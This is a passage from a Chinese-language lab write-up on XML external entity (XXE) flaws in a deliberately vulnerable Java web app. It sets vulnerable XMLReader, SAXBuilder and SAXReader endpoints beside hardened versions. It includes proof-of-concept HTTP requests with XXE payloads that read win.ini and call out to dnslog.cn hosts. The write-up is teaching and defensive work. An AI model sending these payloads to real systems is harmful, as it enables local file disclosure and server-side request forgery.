logger.info(body);<br>        <span class="hljs-type">XMLReader</span> <span class="hljs-variable">xmlReader</span> <span class="hljs-operator">=</span> XMLReaderFactory.createXMLReader();<br>        xmlReader.parse(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputSource</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringReader</span>(body)));  <span class="hljs-comment">// parse xml</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;xmlReader xxe vuln code&quot;</span>;<br>    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        logger.error(e.toString());<br>        <span class="hljs-keyword">return</span> EXCEPT;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ²¡æœ‰ç¦ç”¨ <code>DOCTYPE</code> ä¸å®ä½“ç›¸å…³çš„ SAX ç‰¹æ€§</p><blockquote><p>SAXï¼ˆSimple API for XMLï¼‰è§£æå™¨æ˜¯ä¸€ç§åŸºäºäº‹ä»¶é©±åŠ¨çš„è§£ææ–¹å¼ï¼Œç”¨äºå¤„ç†XMLæ–‡æ¡£ã€‚ä¸DOMè§£æå™¨ä¸åŒï¼ŒSAXä¸éœ€è¦å°†æ•´ä¸ªæ–‡æ¡£åŠ è½½åˆ°å†…å­˜ä¸­ï¼Œå› æ­¤å¯¹äºå¤§å‹æ–‡ä»¶å°¤å…¶æœ‰ç”¨ã€‚</p></blockquote><p>POC:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs xml">POST /xxe/xmlReader/vuln HTTP/1.1<br>Host: 127.0.0.1:8081<br>Content-Type: application/xml<br>Content-Length: 198  å¯ä»¥ä¸å†™<br>Connection: close<br>        æ­¤å¤„ç©ºä¸€è¡Œ åˆ†éš” Header ä¸ Body <br><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">foo</span> [  </span><br><span class="hljs-meta">  <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///C:/Windows/win.ini&quot;</span>&gt;</span>  </span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span><br>æˆ–<br><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">foo</span> [</span><br><span class="hljs-meta">  <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://1izyf3.dnslog.cn&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span><br></code></pre></td></tr></table></figure><p>æŠ“åŒ… <code>http://127.0.0.1:8081/xxe/xmlReader/vuln</code></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080943742.png" alt="20250727115850184"></p><p>ä¿®æ”¹ä¸º POST æäº¤</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/xxe/xmlReader/vuln</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>127.0.0.1:8081<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">sec-ch-ua</span><span class="hljs-punctuation">: </span>&quot;Chromium&quot;;v=&quot;113&quot;, &quot;Not-A.Brand&quot;;v=&quot;24&quot;<br><span class="hljs-attribute">sec-ch-ua-mobile</span><span class="hljs-punctuation">: </span>?0<br><span class="hljs-attribute">sec-ch-ua-platform</span><span class="hljs-punctuation">: </span>&quot;Windows&quot;<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>none<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>navigate<br><span class="hljs-attribute">Sec-Fetch-User</span><span class="hljs-punctuation">: </span>?1<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>document<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>Hm_lvt_1040d081eea13b44d84a4af639640d51=1750255737; JSESSIONID=D2EF253CA324816B83856F97FD262FA9; XSRF-TOKEN=77424855-a7a9-48d1-a3f6-a41419feacf0<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/xml<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>198<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="language-xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="language-xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">foo</span> [</span></span><br><span class="hljs-meta"><span class="language-xml">  <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///C:/Windows/win.ini&quot;</span>&gt;</span></span></span><br><span class="hljs-meta"><span class="language-xml">]&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span></span><br><span class="language-xml">  <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p>å·²ç»è§¦å‘äº† XML è§£æé€»è¾‘ï¼Œä½†æ˜¯æ²¡æœ‰è¯»å–æ–‡ä»¶</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080944650.png" alt="20250727120554070"></p><p>æ¢ä¸€ç§ï¼š</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/xxe/xmlReader/vuln</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>127.0.0.1:8081<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">sec-ch-ua</span><span class="hljs-punctuation">: </span>&quot;Chromium&quot;;v=&quot;113&quot;, &quot;Not-A.Brand&quot;;v=&quot;24&quot;<br><span class="hljs-attribute">sec-ch-ua-mobile</span><span class="hljs-punctuation">: </span>?0<br><span class="hljs-attribute">sec-ch-ua-platform</span><span class="hljs-punctuation">: </span>&quot;Windows&quot;<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>none<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>navigate<br><span class="hljs-attribute">Sec-Fetch-User</span><span class="hljs-punctuation">: </span>?1<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>document<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>Hm_lvt_1040d081eea13b44d84a4af639640d51=1750255737; JSESSIONID=D2EF253CA324816B83856F97FD262FA9; XSRF-TOKEN=77424855-a7a9-48d1-a3f6-a41419feacf0<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/xml<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>198<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="language-xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="language-xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">foo</span> [</span></span><br><span class="hljs-meta"><span class="language-xml">  <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://1izyf3.dnslog.cn&quot;</span>&gt;</span></span></span><br><span class="hljs-meta"><span class="language-xml">]&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span></span><br><span class="language-xml">  <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p>è¯´æ˜æœåŠ¡ç«¯ ç¡®å®è§£æå¹¶è§¦å‘äº†å¤–éƒ¨å®ä½“åŠ è½½ï¼Œè®¿é—®äº†æ„é€ çš„æ¶æ„ URL</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080944167.png" alt="20250727121029322"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080944742.png" alt="20250727121019973"></p><h3 id="2-xmlReader-sec"><a href="#2-xmlReader-sec" class="headerlink" title="2.&#x2F;xmlReader&#x2F;sec"></a>2.&#x2F;xmlReader&#x2F;sec</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RequestMapping(value = &quot;/xmlReader/sec&quot;, method = RequestMethod.POST)</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">xmlReaderSec</span><span class="hljs-params">(HttpServletRequest request)</span> &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">body</span> <span class="hljs-operator">=</span> WebUtils.getRequestBody(request);<br>        logger.info(body);<br><br>        <span class="hljs-type">XMLReader</span> <span class="hljs-variable">xmlReader</span> <span class="hljs-operator">=</span> XMLReaderFactory.createXMLReader();<br>        <span class="hljs-comment">// fix code start</span><br>        xmlReader.setFeature(<span class="hljs-string">&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;</span>, <span class="hljs-literal">true</span>);<br>        xmlReader.setFeature(<span class="hljs-string">&quot;http://xml.org/sax/features/external-general-entities&quot;</span>, <span class="hljs-literal">false</span>);<br>        xmlReader.setFeature(<span class="hljs-string">&quot;http://xml.org/sax/features/external-parameter-entities&quot;</span>, <span class="hljs-literal">false</span>);<br>        <span class="hljs-comment">//fix code end</span><br>        xmlReader.parse(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputSource</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringReader</span>(body)));  <span class="hljs-comment">// parse xml</span><br><br>    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        logger.error(e.toString());<br>        <span class="hljs-keyword">return</span> EXCEPT;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;xmlReader xxe security code&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä¿®æ”¹åçš„æ–¹æ³•ç¦ç”¨ <code>DOCTYPE</code> å£°æ˜ï¼Œç¦ç”¨å¤–éƒ¨å®ä½“ï¼ˆGENERAL + PARAMETERï¼‰</p><h3 id="3-SAXBuilder-vuln"><a href="#3-SAXBuilder-vuln" class="headerlink" title="3.&#x2F;SAXBuilder&#x2F;vuln"></a>3.&#x2F;SAXBuilder&#x2F;vuln</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RequestMapping(value = &quot;/SAXBuilder/vuln&quot;, method = RequestMethod.POST)</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">SAXBuilderVuln</span><span class="hljs-params">(HttpServletRequest request)</span> &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">body</span> <span class="hljs-operator">=</span> WebUtils.getRequestBody(request);<br>        logger.info(body);<br><br>        <span class="hljs-comment">//åˆ›å»ºä¸€ä¸ª JDOM2 çš„ SAXBuilder å®ä¾‹ï¼Œå®ƒç”¨äºå°† XML å­—ç¬¦ä¸²è§£ææˆä¸€ä¸ª JDOM Document å¯¹è±¡</span><br>        <span class="hljs-type">SAXBuilder</span> <span class="hljs-variable">builder</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SAXBuilder</span>();<br>        <span class="hljs-comment">// org.jdom2.Document document</span><br>        builder.build(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputSource</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringReader</span>(body)));  <span class="hljs-comment">// cause xxe</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;SAXBuilder xxe vuln code&quot;</span>;<br>    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        logger.error(e.toString());<br>        <span class="hljs-keyword">return</span> EXCEPT;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>SAXBuilder</code> é»˜è®¤å¼€å¯äº†å¯¹ <strong>å¤–éƒ¨å®ä½“</strong> çš„æ”¯æŒ</p><p>POC:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/xxe/SAXBuilder/vuln</span>  <span class="hljs-string">HTTP/1.1</span><br><span class="hljs-string">Host:</span> 127.0.0.1:8081<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">sec-ch-ua</span><span class="hljs-punctuation">: </span>&quot;Chromium&quot;;v=&quot;113&quot;, &quot;Not-A.Brand&quot;;v=&quot;24&quot;<br><span class="hljs-attribute">sec-ch-ua-mobile</span><span class="hljs-punctuation">: </span>?0<br><span class="hljs-attribute">sec-ch-ua-platform</span><span class="hljs-punctuation">: </span>&quot;Windows&quot;<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>none<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>navigate<br><span class="hljs-attribute">Sec-Fetch-User</span><span class="hljs-punctuation">: </span>?1<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>document<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>Hm_lvt_1040d081eea13b44d84a4af639640d51=1750255737; JSESSIONID=D2EF253CA324816B83856F97FD262FA9; XSRF-TOKEN=77424855-a7a9-48d1-a3f6-a41419feacf0<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/xml<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>150<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="language-xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="language-xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">foo</span> [</span></span><br><span class="hljs-meta"><span class="language-xml">  <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://v50sch.dnslog.cn&quot;</span>&gt;</span></span></span><br><span class="hljs-meta"><span class="language-xml">]&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span></span><br><span class="language-xml">  <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span></span><br><span class="language-xml"></span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080944871.png" alt="20250727122448607"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080944391.png" alt="20250727122444351"></p><h3 id="4-SAXBuilder-sec"><a href="#4-SAXBuilder-sec" class="headerlink" title="4.&#x2F;SAXBuilder&#x2F;sec"></a>4.&#x2F;SAXBuilder&#x2F;sec</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-meta">@RequestMapping(value = &quot;/SAXBuilder/sec&quot;, method = RequestMethod.POST)</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">SAXBuilderSec</span><span class="hljs-params">(HttpServletRequest request)</span> &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">body</span> <span class="hljs-operator">=</span> WebUtils.getRequestBody(request);<br>        logger.info(body);<br><br>        <span class="hljs-type">SAXBuilder</span> <span class="hljs-variable">builder</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SAXBuilder</span>();<br>        <span class="hljs-comment">//ç¦æ­¢ DOCTYPE å£°æ˜ã€‚</span><br>        builder.setFeature(<span class="hljs-string">&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;</span>, <span class="hljs-literal">true</span>);<br>        <span class="hljs-comment">//ç¦æ­¢è§£æ å¤–éƒ¨é€šç”¨å®ä½“ &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br>        builder.setFeature(<span class="hljs-string">&quot;http://xml.org/sax/features/external-general-entities&quot;</span>, <span class="hljs-literal">false</span>);<br>        <span class="hljs-comment">//ç¦æ­¢è§£æ å¤–éƒ¨å‚æ•°å®ä½“</span><br>        builder.setFeature(<span class="hljs-string">&quot;http://xml.org/sax/features/external-parameter-entities&quot;</span>, <span class="hljs-literal">false</span>);<br>        <span class="hljs-comment">// org.jdom2.Document document</span><br>        builder.build(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputSource</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringReader</span>(body)));<br><br>    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        logger.error(e.toString());<br>        <span class="hljs-keyword">return</span> EXCEPT;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;SAXBuilder xxe security code&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="5-SAXReader-vuln"><a href="#5-SAXReader-vuln" class="headerlink" title="5.&#x2F;SAXReader&#x2F;vuln"></a>5.&#x2F;SAXReader&#x2F;vuln</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RequestMapping(value = &quot;/SAXReader/vuln&quot;, method = RequestMethod.POST)</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">SAXReaderVuln</span><span class="hljs-params">(HttpServletRequest request)</span> &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">body</span> <span class="hljs-operator">=</span> WebUtils.getRequestBody(request);<br>        logger.info(body);<br><br>        <span class="hljs-type">SAXReader</span> <span class="hljs-variable">reader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SAXReader</span>();<br>        <span class="hljs-comment">// org.dom4j.Document document</span><br>        reader.read(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputSource</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringReader</span>(body))); <span class="hljs-comment">// cause xxe</span><br><br>    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        logger.error(e.toString());<br>        <span class="hljs-keyword">return</span> EXCEPT;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;SAXReader xxe vuln code&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>POC:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/xxe/SAXReader/vuln</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>127.0.0.1:8081<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">sec-ch-ua</span><span class="hljs-punctuation">: </span>&quot;Chromium&quot;;v=&quot;113&quot;, &quot;Not-A.Brand&quot;;v=&quot;24&quot;<br><span class="hljs-attribute">sec-ch-ua-mobile</span><span class="hljs-punctuation">: </span>?0<br><span class="hljs-attribute">sec-ch-ua-platform</span><span class="hljs-punctuation">: </span>&quot;Windows&quot;<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>none<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>navigate<br><span class="hljs-attribute">Sec-Fetch-User</span><span class="hljs-punctuation">: </span>?1<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>document<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>Hm_lvt_1040d081eea13b44d84a4af639640d51=1750255737; JSESSIONID=D2EF253CA324816B83856F97FD262FA9; 